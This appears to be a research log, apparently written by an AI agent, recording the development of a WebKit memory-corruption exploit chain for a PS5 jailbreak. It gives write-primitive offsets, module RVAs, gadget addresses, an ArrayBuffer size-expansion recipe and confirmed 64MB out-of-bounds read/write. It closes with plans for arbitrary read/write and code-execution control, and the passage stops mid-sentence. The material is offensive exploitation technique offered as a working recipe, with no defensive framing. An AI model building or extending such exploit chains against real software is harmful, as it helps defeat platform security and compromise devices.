# Claude Findings — V39/V40 Session (2026-11-14)

## V39 Probe: Write Footprint + Multi-Shot Test

### Device-Confirmed COOP Write Primitive Mask

The V39 sentinel test filled the forged promise region with 0x42 sentinel bytes
and fired the COOP write (FontFace.load() -> fontStateChanged(Failure) ->
DOMPromiseProxy::reject()). Byte-level diff reveals the **exact write footprint**:

```
Promise-relative offset  | Before | After | Size | What writes it
-------------------------|--------|-------|------|----------------------------------
+0x08..+0x0B             | 0x42   | 0x0F  | 4B   | ExceptionCode::NetworkError (=15)
+0x0C..+0x0F             | 0x42   | 0x42  | 4B   | UNTOUCHED (struct padding)
+0x10..+0x17             | 0x42   | 0x00  | 8B   | String m_message (null RefPtr)
+0x18                    | 0x42   | 0x00  | 1B   | Expected::has_value = false
+0x19..+0x1F             | 0x42   | 0x42  | 7B   | UNTOUCHED (padding)
+0x20                    | 0x00   | 0x01  | 1B   | optional::engaged = true
+0x21..+0x27             | 0x42   | 0x42  | 7B   | UNTOUCHED (padding)
```

Post-write raw hex (promise+0x00 through +0x27):
```
42424242 42424242  0f000000 42424242
00000000 00000000  00424242 42424242
01424242 42424242
```

### Write Classification (device-confirmed)

| Region    | Offsets     | Written? | Value               | Notes                              |
|-----------|------------|----------|---------------------|------------------------------------|
| code      | +0x08-0x0B | YES      | 0x0000000F (fixed)  | ExceptionCode enum, always NetworkError |
| pad0C     | +0x0C-0x0F | NO       | preserved           | Struct padding after m_code        |
| string10  | +0x10-0x17 | YES      | 0x0000000000000000  | **8-byte null write** (key primitive)   |
| hasval18  | +0x18      | YES      | 0x00                | Expected has_value                 |
| hvpad     | +0x19-0x1F | NO       | preserved           | Padding after has_value            |
| engaged20 | +0x20      | YES      | 0x01                | optional engaged flag              |

### Multi-Shot: CONFIRMED

Phase B re-zeroed the forged promise, re-crafted the face, and fired load() a
second time. Result:

- **B-WRITE-MASK:** `+08:00>0f | +20:00>01` (same code + engaged pattern)
- **B-LOAD-RETURNED:** yes, clean return
- **B status=4, rc-after=1:** consistent with Phase A

This proves the COOP write is **repeatable** — the same face can fire multiple
times with different promise targets, giving us a multi-shot targeted write
primitive.

### The Usable Primitives (from one COOP write shot)

1. **uint32 write of 0xF at target+0x08** — fixed value, limited direct use
2. **8-byte zero write at target+0x10** — **the most powerful**: nullifies any
   pointer at a chosen address. This is a surgical null-write primitive.
3. **byte write of 0x00 at target+0x18** — clears a single byte
4. **byte write of 0x01 at target+0x20** — sets a single byte to 1

All relative to where we aim m_loadedPromise. Since m_loadedPromise is at
head+0x18 = S+0x88, and the promise region starts at the address we write there,
we can aim these writes at **any readable/writable address** by setting
S+0x88 = (target_address - 0x08) for the code write, or
S+0x88 = (target_address - 0x10) for the null write, etc.

### Key Constraint

The write offsets are fixed relative to each other within a single shot. To write
at non-aligned offsets, we need multiple shots with different aim points. Since
multi-shot is confirmed, this is viable.

---

## Prior Confirmed Facts (from earlier sessions, still valid)

### Address Layout (device-verified)
- **VP_RVA** = 0x724DB28 (FontFace vtable pointer, from module base)
- **BASE** = VP - 0x724DB28
- **fontStateChanged** = BASE + 0x5B3D6B0
- **noop gadget** = BASE + 0x4001750

### CSSFontFace Offsets (device-verified)
- +0x82 = status byte (0=Pending, 4=Failure)
- +0x87 = FontLoadTimingOverride
- +0x58 = m_clients (HashCountedSet pointer, our table install point)
- +0x60..0x67 = hash-table header (zeroed for safe iteration)
- +0x88..0xBF = timer region (borrowed from sibling)

### FontFace Wrapper Layout (device-verified)
- +0x00 = vtable pointer (VP, MUST be real — address validation wall)
- +0x08 = impl pointer (L2 = CSSFontFace backing)
- +0x10 = m_backing
- +0x18 = m_loadedPromise (the aim point for COOP writes)

### JSDataView Cell Layout (device-verified)
- +0x00..0x07 = JSCell header (structureID, type, flags, cellState)
- +0x08 = butterfly (0 for DataView)
- +0x10 = m_vector (CagedPtr to backing store)
- +0x18 = m_length (0x40)
- +0x20 = m_byteOffset (0x20)
- +0x28..0x2F = m_mode
- +0x30 = m_buffer (ArrayBuffer pointer)

### Address Validation Wall (device-proven, V36p/V36R)
PS5 validates the vtable ADDRESS POINT on virtual dispatch. A byte-identical
clone of the vtable at a different address CRASHES (V36R), while the real vtable
at the real address RETURNS (V36p). This means:
- Fake vtable route is **permanently closed**
- Only COOP (using the REAL vtable with controlled data fields) works
- CFI/vtable checks are address-based, not content-based

### StructureID on PS5 (source-confirmed, path DEAD)
- PLATFORM(PLAYSTATION) uses offset-based encoding, not table-indexed
- structureHeapAddressSize = 128MB, mask = 0x7FFFFFF
- decode() = (bits & 0x7FFFFFF) + startOfStructureHeap
- Writing 0xF as structureID decodes to startOfStructureHeap + 0xE
- This is below MarkedBlock::blockSize (16KB) = **INVALID**
- **StructureID confusion via the 0xF write is a dead path on PS5**

---

## Strategic Analysis: What the COOP Write Gives Us

### The 8-byte null write at +0x10 is the key escalation vector.

Given multi-shot capability, we can aim the null write at specific fields of
JS objects to corrupt them in useful ways:

**Option A: Null m_vector of a JSArrayBufferView (TypedArray/DataView)**
- Aim promise at (DataView_cell + 0x10 - 0x10) = DataView_cell
- The +0x10 null write hits m_vector, zeroing the backing store pointer
- Problem: a zeroed m_vector means reads/writes go to address 0 = crash
- Not directly useful unless combined with something else

**Option B: Null the butterfly of a JSObject**
- Aim at (object + 0x08 - 0x10) = object - 0x08
- Writes null to butterfly field at object+0x08
- Could cause the engine to allocate a new butterfly, but risky

**Option C: Corrupt ArrayBuffer internals**
- If we can find/aim at the ArrayBuffer's m_data pointer and null it,
  then re-allocate, we might get overlapping buffers
- Requires knowing ArrayBuffer layout and address

**Option D: Corrupt a JSDataView's m_length via partial overwrite**
- The 0xF write at +0x08 writes uint32(0x0000000F) 
- Aim at (DataView_cell + 0x18 - 0x08) = DataView_cell + 0x10
- This writes 0x0000000F at DataView_cell+0x18 = m_length
- But m_length is size_t (8 bytes) and the upper 4 bytes of the qword
  come from the +0x0C padding (UNTOUCHED = whatever was there)
- If m_length was originally 0x40 (64), it becomes 0x????????0000000F
  where the upper bytes are preserved. Not useful for expansion.

**Option E: Corrupt m_mode of a JSArrayBufferView**
- m_mode is at +0x28. The engaged write (0x01) is at promise+0x20.
- Aim at (view_cell + 0x28 - 0x20) = view_cell + 0x08
- This puts the 0x01 at view_cell+0x28 = m_mode
- But it also writes 0x0000000F at view_cell+0x10 (m_vector!) = corruption
- And zeroes view_cell+0x18 (m_length) — makes length 0. Not useful.

**Option F: Two-shot length expansion attack**
- Shot 1: Aim null write at a DataView's m_byteOffset (+0x20)
  - Promise aimed at (cell + 0x20 - 0x10) = cell + 0x10
  - Writes: 0x0F at cell+0x18 (m_length = 15, was 64 — shrink, bad)
  - Zeroes cell+0x20 (m_byteOffset = 0, was 0x20 — shifts window start)
  - This alone isn't useful.

**Option G: Target a non-JS engine structure**
- RefCounted pointers, RunLoop timers, DOM nodes
- Null a ref-count or a pointer to cause a premature free -> new UAF
- This is the most promising general approach

**Option H: Create overlapping ArrayBuffers via ArrayBuffer.transfer()**
- If we can corrupt the m_data/m_size of an ArrayBuffer *header*
  (not the JSCell wrapper but the C++ ArrayBuffer object)
- The null write at +0x10 could zero the m_data pointer
- A subsequent transfer() or slice() might re-allocate with stale size

---

## V40 Probe: ArrayBuffer Layout Recon — CONFIRMED

### Device-Confirmed ArrayBuffer C++ Object Layout

ArrayBuffer at **0x100089e220** (this run), backing the certified DataView.

```
Offset  Field              Value               Source Prediction  Match
------  -----------------  ------------------  -----------------  -----
+0x00   m_refCount         0x00000001          uint32             ✓
+0x04   [padding]          0x00000000          4B pad             ✓
+0x08   m_encodedPointer   0x10007e5840        uintptr_t          ✓
+0x10   m_data (CagedPtr)  0x10003f6500        ptr to backing     ✓ = arrayBufferBase
+0x18   m_destructor       0x10007e48a0        RefPtr<SharedTask> ✓ (non-null = Gigacage destructor)
+0x20   m_shared           0x0000000000000000  RefPtr             ✓ (not shared)
+0x28   m_memoryHandle     0x0000000000000000  RefPtr             ✓ (no handle)
+0x30   m_sizeInBytes      0x0000000000000100  size_t = 256       ✓
+0x38   m_maxByteLength    0x0000000000000100  size_t = 256       ✓ (= sizeInBytes)
+0x40   m_hasMaxByteLength 0x00                bool = false       ✓ (not resizable)
+0x48   m_watchpoint       0x0000000000000003  InlineWatchpointSet ✓ (state = IsInvalidated)
+0x50   m_wrapper          0x10008da7d8        Weak<JSArrayBuffer> ✓
+0x58   m_pinCount         0x00000000          uint32 = 0         ✓
+0x5C   m_isWasmMemory     0x00                bool = false       ✓
+0x5D   m_locked           0x00                bool = false       ✓
```

**ALL 15 FIELDS MATCH SOURCE PREDICTION.** Layout is byte-accurate.

### Key Device Facts from V40

1. **m_data = 0x10003f6500** matches arrayBufferBase (V - 0x20 = 0x10003f6520 - 0x20).
   Cross-referenced via data region read: marker A at mData+0x20 = 0x13579bdf02468ace ✓

2. **m_destructor is NON-NULL (0x10007e48a0)** — this is the Gigacage
   `primitiveGigacageDestructor`. Every Gigacage-allocated ArrayBuffer has it.
   This means zeroing m_data would leave a live destructor pointing at freed
   memory → crash on GC. **Direct m_data corruption is unsafe.**

3. **m_sizeInBytes = 256 (0x100)**, not 64 (0x40). The spray allocates 256-byte
   ArrayBuffers. The DataView sees 64 bytes at byteOffset 0x20 within it.

4. **isSimple = false** because m_destructor is non-null. m_shared and
   m_memoryHandle are both null (good — not shared, not resizable).

5. **m_refCount = 1** with actual = 0 (the DeferrableRefCounted scheme uses
   m_refCount/2 for actual count, bit 0 = deferred flag). Value of 1 means
   deferred=true, refs=0. The GC owns it exclusively via the deferred mechanism.

6. **m_watchpoint = 3** = InlineWatchpointSet in IsInvalidated state (already
   fired). This is expected — the detaching watchpoint fires when the buffer is
   first observed.

### Why Direct ArrayBuffer Corruption Won't Work

Every COOP write shot writes a fixed pattern relative to the aimed address:
```
promise+0x08: uint32 0x0000000F
promise+0x10: 8-byte ZERO
promise+0x18: byte 0x00
promise+0x20: byte 0x01
```

**Targeting this ArrayBuffer's m_sizeInBytes (+0x30):**
- Aim promise at AB+0x20
- Writes 0xF at AB+0x28 (m_memHandle — was null, now has garbage in low bytes)
- Zeroes AB+0x30 (m_sizeInBytes → 0)  ← SHRINKS, doesn't expand
- Corrupts AB+0x38 (m_maxByteLength low byte → 0)
- Sets AB+0x40 (m_hasMaxByteLength → 1)
- **Result: buffer reports size=0. All DataView accesses fail. Useless.**

**Targeting m_data (+0x10):**
- Aim promise at AB+0x00
- Writes 0xF at AB+0x08 (m_encodedPointer — GC tracking corrupted)
- Zeroes AB+0x10 (m_data → NULL)
- Clears AB+0x18 low byte (m_destructor low byte → 0, corrupts function ptr)
- Sets AB+0x20 low byte (m_shared low byte → 1, creates fake shared ptr)
- **Result: null data pointer + corrupted destructor + fake shared ref = triple crash.**

**Conclusion: The COOP write cannot directly create an expanded view or useful
corruption on the certified ArrayBuffer. A different target is needed.**

### The Refcount Corruption Strategy (V41 Plan)

The COOP write's 8-byte zero at promise+0x10 is perfect for **nullifying a
refcount**, which triggers a premature free → use-after-free.

**Target: A RefCounted C++ object whose address we know.**

We already have arbitrary read (readAt). We can:
1. Allocate many DOM objects of known type/size (e.g., FontFace objects)
2. Read their backing C++ object addresses via readAt
3. Aim the COOP write's 8-byte zero at the target's refcount field
4. The zeroed refcount causes the next deref() to trigger deletion
5. The freed memory is reclaimed with a controlled allocation (e.g., ArrayBuffer)
6. The dangling JS reference now operates on our controlled data → type confusion

**Best target: A NEW FontFace object** (not the UAF'd one).
- We control its creation and know its C++ backing address
- FontFace.m_backing (CSSFontFace) has a known layout
- CSSFontFace likely uses RefCounted with refcount at +0x00
- Zeroing the refcount at +0x00: aim promise at (target - 0x10)
  - Writes 0xF at target-0x08 (previous object's tail — padding if aligned)
  - Zeroes target+0x00 (refcount → 0) ← THE KILL
  - Clears target+0x08 (low byte)
  - Sets target+0x10 (low byte = 1)

**Alternative target: The m_destructor RefPtr in the ArrayBuffer.**
- m_destructor at AB+0x18 is a RefPtr<SharedTask<void(void*)>>
- The SharedTask object it points to (0x10007e48a0) is RefCounted
- If we read that object's refcount and zero it, the SharedTask is freed
- Then when GC cleans up the ArrayBuffer, it calls a freed function pointer
- This is a controlled code-execution path if we can reclaim the SharedTask allocation

---

## V41 Probe: SharedTask Recon + Heap Layout — CONFIRMED

### SharedTask Destructor Object (the Gigacage::free wrapper)

The ArrayBuffer's m_destructor (at AB+0x18) points to a SharedTask singleton.
Read from device (session PYZTF5):

```
SharedTask object layout:
+0x00: vtable        = 0x82716a200  (RVA = 0x715a200)
+0x08: m_refCount    = 165          (165 ArrayBuffers share this singleton)
+0x10: m_functor data...

Vtable entries:
  [0] typeinfo   = 0x824011750  (RVA 0x4001750 = NOOP GADGET — confirms BASE!)
  [1] destructor = 0x82405e0c0  (RVA 0x404e0c0 = ~SharedTaskFunctor dtor)
  [2] run        = 0x824c41760  (RVA 0x4c31760 = Gigacage::free(Primitive, p))
```

Key facts:
- **refCount = 165**: this is a global singleton shared by ALL Gigacage ArrayBuffers.
  Zeroing it → unsigned underflow (0-1=0xFFFFFFFF) → no deletion trigger. Dead path.
- **typeinfo = noop gadget**: independently confirms our BASE calculation.
- **run() RVA = 0x4c31760**: the address of the Gigacage free wrapper function.

### Heap Layout: Spray Buffers Are Contiguous

Read 64 bytes before and after the certified AB's backing store (at 0x10002f2500,
size 0x100 = 256 bytes):

**PRE-BUF (buffer - 0x40):**
```
q0 = 0x200000001000    (heap chunk header / metadata)
q1..q6 = 0x0           (zeroed region)
q7 = 0x0123456789abcdef (OUR MARKER F at buffer-8 = V+0xD8)
```

**POST-BUF (buffer + 0x100):**
```
q0 = 0xdeadbeefcafebabe (MARKER E — the NEXT spray buffer's data!)
q1 = 0x0
q2 = 0x0
q3 = 0x55aa33cc0ff0e11e (MARKER C — the next buffer's marker layout)
```

**CRITICAL FINDING: Spray buffers are CONTIGUOUS in Gigacage.**
Buffer N (256 bytes) ends exactly where buffer N+1 starts. No gaps, no metadata
between them. This means an OOB read/write past one buffer immediately lands
in the adjacent buffer's data.

### Gigacage Configuration

**Gigacage base = 0x1000000000** (0x10_0000_0000 = 64 GB virtual address).
Both 4GB and 32GB alignment masks give the same base. All Gigacage pointers
observed (0x10002f2500, 0x10003f6500) are within this cage.

### Bounds Check Bypass (source-confirmed)

From JSArrayBufferView.h: `canUseRawFieldsDirectly()` checks `(m_mode & 0x07) <= 2`.
Our DataView m_mode = 0x88 → `0x88 & 0x07 = 0 <= 2` → **TRUE**.

This means the DataView bounds check uses ONLY `m_length` from the JSCell field,
**NOT** the ArrayBuffer's runtime sizeInBytes. If we corrupt m_length in the cell,
the DataView trusts the corrupted value blindly. Combined with contiguous spray
buffers, expanding m_length past 256 gives OOB into the next buffer.

---

## V42 Probe: AB Size Expansion via COOP Write at AB+0x17 — PARTIAL SUCCESS

### The isFulfilled Gate Discovery

**V42 first attempt (cell corruption):** Aimed COOP write at cell+0x10 to modify
the DataView cell's m_length. FAILED SILENTLY. Root cause: isFulfilled() reads
the byte at (aim+0x20) = cell+0x30 = m_buffer low byte = 0x20 (non-zero).
isFulfilled returns true, reject() is never called, zero bytes written.

**Key rule discovered:** ANY COOP write aimed at address X requires the byte at
X+0x20 to be 0x00 before firing. Otherwise isFulfilled() returns true and the
write is silently skipped.

Additionally, the deferred Vector at X+0x28 must have size=0, otherwise the
Vector copy triggers a memcpy from the buffer pointer (crash if non-null with
non-zero size).

### The AB+0x17 Aim (from peer review)

Aiming at AB+0x17 was identified by another agent as the optimal target:

**Gate check:** X+0x20 = AB+0x37 = m_sizeInBytes byte 7 (MSB) = **0x00** ✓
**Vector check:** size dword at X+0x28+0x08+0x04 = AB+0x4B = watchpoint bytes 3-6 = **0x00000000** ✓

**Write map (verified against device dump):**

```
Write         Lands on          Pre-state  Post-state  Effect
-----------   ----------------  ---------  ----------  ------
0xF (4B)      AB+0x1F..0x22    00,00,00,00  0F,00,00,00  m_destructor MSB = 0x0F (COLLATERAL)
8B zero       AB+0x27..0x2E    all 0        all 0        m_shared/m_memHandle (harmless)
byte 0x00     AB+0x2F          0            0            m_memHandle MSB (harmless)
byte 0x01     AB+0x37          0            0x01         m_sizeInBytes MSB → SIZE EXPANSION!
```

### Device Result (session BJZ8LQ)

```
V42-SIZE-EXPANDED=0x100000000000100
V42-DTOR-MSB=0xf
V42-NEW-SIZE=0x100000000000100
```

**m_sizeInBytes: 0x0000000000000100 (256) → 0x0100000000000100 (~72 PB)**

The COOP write successfully expanded the ArrayBuffer's reported size from 256
bytes to ~72 petabytes. The destructor MSB was corrupted to 0x0F as expected
(repairable from the OOB view once working).

### DataView Creation FAILED

```
V42-BIGDV-ERR-Length out of range of buffer
```

Despite the AB reporting ~72 PB via `byteLength()`, creating a 64MB DataView
threw "Length out of range of buffer". The error comes from
`ArrayBufferView::verifySubRangeLength()` in JSDataView.cpp:58-59.

**Investigation in progress.** The verifySubRangeLength arithmetic should pass:
- `byteLength()` returns 0x0100000000000100 (huge) via `m_contents.sizeInBytes()`
- `byteOffset(0) > byteLength(huge)` → false ✓
- `remainingElements = (huge - 0) / 1 = huge`
- `numElements(64M) > huge` → false ✓

Possible causes under investigation:
1. A secondary check in the JS constructor path before reaching JSDataView::create
2. The ConstructionContext or CagedPtr tagging rejecting the size
3. An overflow in Checked<> arithmetic somewhere in the path
4. PS5 firmware having an additional size validation not in the 1400 source

### V43 Result: ALL DataView Sizes Rejected

```
V43-DV-FAIL-size=0x4000000-Length out of range of buffer
V43-DV-FAIL-size=0x1000000-Length out of range of buffer
V43-DV-FAIL-size=0x100000-Length out of range of buffer
V43-DV-FAIL-size=0x10000-Length out of range of buffer
V43-DV-FAIL-size=0x1000-Length out of range of buffer
V43-DV-FAIL-size=0x400-Length out of range of buffer
V43-DV-FAIL-size=0x200-Length out of range of buffer
V43-DV-FAIL-size=0x101-Length out of range of buffer
V43-ALL-SIZES-FAIL
```

Even **257 bytes** (1 byte past original 256) fails. The expansion at the C++ level
is confirmed (m_sizeInBytes = 0x0100000000000100), but `verifySubRangeLength`
still rejects. This means either:

1. The PS5 firmware has an additional size validation not in the WebKit 1400 source
2. There's a secondary bounds check (possibly CagedPtr bounds or Gigacage cage size)
3. The `buffer.byteLength()` call in verifySubRangeLength returns a different value
   than m_sizeInBytes (e.g., clamped by MAX_ARRAY_BUFFER_SIZE)

### V44 Result: JS byteLength Still 256 — Wrong AB Corrupted

```
V44-JS-BYTELEN=256          ← JS sees original size, NOT expanded
V44-U8-OK-size=0x100        ← 256 works, 257 fails
V44-DV-OK-size=0x100        ← same
V44-SLICE-OK-len=256        ← slice also clamped to 256
V44-maxByteLength=0x100     ← unchanged
V44-hasMaxByteLength=0      ← unchanged
```

**Root cause: We corrupted the WRONG ArrayBuffer.**

The COOP write expanded m_sizeInBytes on the AB at address `AB_ADDR` (found via
`DataView.m_buffer` at DV cell+0x30). But the JS `sprayBuf.byteLength` getter
goes through `JSArrayBuffer.m_impl`, which points to a DIFFERENT C++ ArrayBuffer.

From V44's JSArrayBuffer wrapper dump:
- WeakImpl at AB+0x50 = 0x10007fb7d8
- Reading that address revealed what appeared to be a JSArrayBuffer cell
- Its m_impl at +0x10 = **0x10001944b0** ≠ AB_ADDR (0x100089e220)

**Two possible explanations:**
1. The DataView's m_buffer and the JSArrayBuffer's m_impl are different C++ objects
   that somehow share the same backing store (unlikely in WebKit)
2. The WeakImpl at AB+0x50 is NOT the JSArrayBuffer cell — it's a WeakImpl*
   that points to a WeakImpl, which in turn references the JSArrayBuffer
   (need to follow the indirection correctly)

### V45 Result: Correct AB Expanded, JS STILL Returns 256

V45 followed the WeakImpl chain correctly:
```
V45-WEAKIMPL=0x10008ab3d8
V45-JSAB-CELL=0x1000713f68           ← JSArrayBuffer GC cell
V45-REAL-AB=0x1000896220             ← JSArrayBuffer.m_impl (C++ ArrayBuffer)
V45-REAL-mData=0x10002f2600-match=true  ← m_data matches buffer data base ✓
V45-SIZE-EXPANDED=0x100000000000100  ← native m_sizeInBytes = 72 PB ✓
V45-JS-BYTELEN=256                   ← JS STILL SEES 256
```

**The correct C++ ArrayBuffer WAS expanded** (readAt confirms m_sizeInBytes is
0x0100000000000100). But `sprayBuf.byteLength` still returns 256.

This means the JS `byteLength` getter does NOT read from `m_sizeInBytes` of
the C++ ArrayBuffer, at least not through the path we expect. Possible causes:

1. **JSArrayBuffer inline storage caches the size** — JSNonFinalObject has
   inline property slots starting at +0x10. If JSArrayBuffer has inline slots,
   `m_impl` might not be at +0x10 and the getter might read a cached size from
   an inline slot instead of going through m_impl.

2. **JIT-compiled getter** — the byteLength accessor might be JIT-compiled to
   read from a specific offset in the cell, bypassing the C++ virtual call chain.

3. **PS5-specific divergence** — Sony's firmware may add size caching that the
   WebKit 1400 source doesn't show.

### V46 Result: ByteLength Cached in JSArrayBuffer Inline Storage

Full JSArrayBuffer cell at 0x100086c338 (128 bytes):
```
q0  @0x00 = 0x260000008f00     JSCell header (structureID=0x8F00, type=0x26)
q1  @0x08 = 0x0                butterfly (null)
q2  @0x10 = 0x100088a220       m_impl (ArrayBuffer*) — points to expanded AB ✓
q3  @0x18 = 0x0                inline slot 0
q4  @0x20 = 0x0                inline slot 1
q5  @0x28 = 0x100000000        inline slot 2: CONTAINS 256 at bytes 0x2B-0x2E!
q6  @0x30 = 0x800000007        inline slot 3
q7-q15 = 0x0                   remaining inline storage (empty)
```

**`FOUND-256-AT=[0x2b]`** — The byte length 256 is stored at cell byte offset
0x2B, which is inside the qword at cell+0x28 (q5 = 0x100000000).

`IMPL-SIZE=0x100000000000100` — m_impl at cell+0x10 correctly points to the
expanded AB with 72 PB m_sizeInBytes. But JS reads the CACHED value in q5.

**Root cause confirmed:** The PS5 JSArrayBuffer stores byteLength as a JS
property in inline storage (cell+0x28). The `byteLength` getter reads this
cached value, NOT m_impl→m_contents.sizeInBytes(). Expanding the C++ AB
doesn't affect what JS sees.

### V47 Result: Inline Cache Theory DEAD — Walk Loop Confirmed

```
V47-GETTER-TYPE=accessor          ← live prototype accessor, no cell-side cache
V47-GETTER-CALL=256               ← explicit getter.call also returns 256
V47-NATIVE-SIZE=0x100000000000100 ← readAt confirms expansion on the object we hit
```

**The walk loop is confirmed:** V45's chain A → A.m_wrapper → WeakImpl → 
JSArrayBuffer → cell.m_impl → A was a perfect circle. Every shot (V42, V45, V47)
expanded the SAME object — the DataView's m_buffer from page-load era. The JS
`sprayBuf` variable's authoritative m_impl is a DIFFERENT native ArrayBuffer.

**FOUND-256-AT was an artifact:** The unaligned dword search found 256 at a byte
boundary between two unrelated uint32 fields (0x00000000 followed by 0x00000001 =
{0,1} as separate values, not a cached 256).

**The byteLength getter reads m_impl→byteLength() (full size_t, no truncation)
per JSArrayBufferPrototype.cpp:257.** The fact that it returns 256 proves
m_impl points to an UNEXPANDED native ArrayBuffer — one we never shot.

### V48 Result: OOB READ/WRITE CONFIRMED

```
V48-SAME=false                             H1: DRIFT CONFIRMED
V48-FRESH-MBUF=0x100088e5e0              The REAL impl (different from stale A)
V48-REAL-NEW-SIZE=0x100000000000100       Real impl expanded to 72 PB
V48-JS-BL-POST=72057594037928200         JS NOW SEES THE EXPANDED SIZE
V48-OOB-RW-CONFIRMED-size=0x1000         4KB OOB READ/WRITE FROM JS
```

The drift hypothesis was correct. V48 found the real authority AB via a fresh
DataView cell scan, expanded it, and achieved OOB read/write from JavaScript.
The 4096-byte DataView reads/writes past the 256-byte buffer into adjacent
Gigacage allocations.

**Next: V49 — 64MB expansion + Gigacage ARW bootstrap.**

---

## Files Created/Modified This Session

| File | Location | Status |
|------|----------|--------|
| v39-patch.js | D:\ps5\tools\remote-loader\ | Created (source patch) |
| v39.html | D:\ps5\tools\remote-loader\ | Created (full probe) |
| v39.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Copied (active serving dir) |
| v40.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (AB recon probe) |
| v40-patch.js | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (reference doc) |
| v41.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (heap recon probe) |
| v41-patch.js | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (reference doc) |
| v42.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (AB expansion, checkpoint) |
| v43.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Created (size probe iteration) |
| index.html | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Updated (points to v43) |
| scan-watch.ps1 | D:\ps5\PS5-14.10-Jailbreak-Research\tools\remote-loader\ | Updated (V39-V42 beacon support) |
| CLAUDE_FINDINGS.md | D:\ps5\PS5-14.10-Jailbreak-Research\ | This file |

### V48 Result: DRIFT CONFIRMED - THE OOB VIEW EXISTS - JS-LAND HEAP R/W ACHIEVED

Beacons (session 02:12, dispatcher v48.html?v=13):

```
V48-FRESH-DV-OK-len=64                    <- fresh DataView created over sprayBuf THIS session
V48-SCAN-FOR-FRESH-DV ... V48-SCANNED=519 <- engine-resolved cell found by scan
V48-FRESH-CELL=0x1000868180-mbuf=0x100088e5e0
V48-STALE-A=0x100088e220
V48-SAME=false
V48-H1-DRIFT-CONFIRMED                    <- the authority is a DIFFERENT native AB than
                                            every object previously expanded
V48-REAL-mData=0x10002f0400-mSize=0x100   <- the real impl dumped (fresh cell's m_buffer)
V48-GATE=0x0-VECSZ=0x0                    <- aim-window gates verified
V48-FIRE-AT-REAL-IMPL=0x100088e5e0        <- the AB+0x17 shot at the REAL authority
V48-REAL-NEW-SIZE=0x100000000000100       <- 72 PB, readAt-confirmed
V48-JS-BL-POST=72057594037928200          <- THE JS GETTER NOW RETURNS THE EXPANSION
V48-LADDER-OK-0x101-len=257               <- new DataView(buf,0,0x101) CONSTRUCTS
V48-LADDER-OK-0x1000-len=4096             <- a 4096-byte view on a 256-byte buffer!
V48-OOB-Q-0x100=0x0                       <- OOB read past the buffer end
V48-OOB-WRITE=0x42                        <- OOB byte written and read back
V48-OOB-RW-CONFIRMED-size=0x1000          <- *** OUT-OF-BOUNDS READ/WRITE CONFIRMED ***
```

**THE MILESTONE: JS-land out-of-bounds read/write over the Gigacage heap via a
fully legitimate JSCell** - real structure, real impl, CFI-untouched,
GC-coherent. The fixed-value-write era ends here.

What V48 proved:
1. H1 (impl drift) was correct - no Sony binary divergence, no byteLength cache.
   The getter/constructor authority is the native ArrayBuffer that the CURRENT
   JSArrayBuffer cell's m_impl resolves to - a different object than the
   page-load-era object held by the old (CSCAN-certified) DataView cells and
   the wrapper-weak loop (which resolved back to that same stale object every
   time). The fresh-cell discriminator settled it in one shot.
2. The 1400 source is faithful: byteLength() -> m_contents.sizeInBytes() ->
   m_sizeInBytes; verifySubRangeLength is size_t-clean. Expand the RIGHT
   object and everything just works.
3. The aim-window law + AB+0x17 recipe is a reliable, reusable surgical
   primitive: gate byte pre-zero, Vector size slot zero, two bytes changed
   (m_sizeInBytes MSB payload + m_destructor MSB 0x0F collateral, repairable
   from the view).

Notes for V49:
- The expanded buffer's base (0x10002f0400) != the certified tagged buffer
  (#10 at 0x10002f2600; DATA-MATCH=false) - the probe's fresh DV resolved to a
  different spray buffer than the certified one. Harmless for the primitive
  (the JS object and its impl agree), but V49 should unify the two chains.
- The stray LADDER-FAIL-0x101 "Out of bounds access" was a boundary index
  read, not a construction failure.
- V49 plan: scale the ladder (0x4000000 = 64 MB), witness real targets
  through the view (adjacent spray markers, the AB objects, the SharedTask
  singleton), REPAIR the corrupted destructor MSBs (stale A + real impl) from
  the view, then bootstrap: rewrite every other spray buffer's m_sizeInBytes
  from the view itself -> full-cage R/W -> RIP work (SharedTask run() chain).

### V49 Result: THE 64MB OOB VIEW + FULL REPAIR + FLEET DISCOVERY

Beacons (session 02:16):

```
V49-OOB-DV-OK-size=0x4000000             <- a 64 MB DataView CONSTRUCTED
V49-OOB-RW-CONFIRMED-size=0x4000000       <- OOB read/write confirmed at 64 MB scale
V49-OOB-BASE=0x10002f0400  V49-OOB-END=0x10042f0400   <- the view window
V49-STALE-DTOR-MSB=0xf  -> V49-STALE-DTOR-REPAIRED
V49-STALE-SIZE-MSB=0x1  -> V49-STALE-SIZE-REPAIRED    <- stale A fully restored
V49-REAL-DTOR-MSB=0xf   -> V49-REAL-DTOR-REPAIRED     <- live impl dtor fixed
V49-AB-SCAN-found=10    <- 10 more spray AB objects located THROUGH the view:
   0x100088e0a0/f160/f1c0/f220/f2e0/f340/f400/f460/f4c0/f580
   (m_data 0x10002f2100..f2b00, f0800; all m_sizeInBytes=0x100)
V49-JS-BL-FINAL=72057594037928200        <- consistent end state
```

What V49 achieved:
1. THE VIEW AT SCALE: 64 MB OOB DataView over the cage, R/W verified.
2. SELF-REPAIR: every collateral byte from the entire V42-V48 shot history
   (stale A: dtor MSB + size MSB; real impl: dtor MSB) repaired from JS via
   the view - the corrupted state is now clean except the ONE intentional
   byte (the live impl's m_sizeInBytes MSB, the expansion itself).
3. FLEET DISCOVERY: 10 further native ArrayBuffer objects found in-range,
   each at a known view offset with m_sizeInBytes=0x100 - ready for
   expansion DIRECTLY FROM THE VIEW (no more COOP shots needed for them:
   just write their m_sizeInBytes MSB via the view).
4. Module addresses (e.g. the SharedTask vptr at 0x8xxxxxxx) sit BELOW the
   view base (negative offsets) - module reads remain via the oracle;
   in-cage targets are fully covered.

V50 plan: expand the fleet from the view (write each AB's m_sizeInBytes),
construct 64MB views over each -> full-cage coverage in both directions;
then aim views at the JSC cell region (m_vector rewrites on fresh DataViews
= absolute arbitrary R/W), then RIP work: the SharedTask singleton (vtable
RVA 0x715A200, run() RVA 0x4C31760) with its heap-resident functor payload,
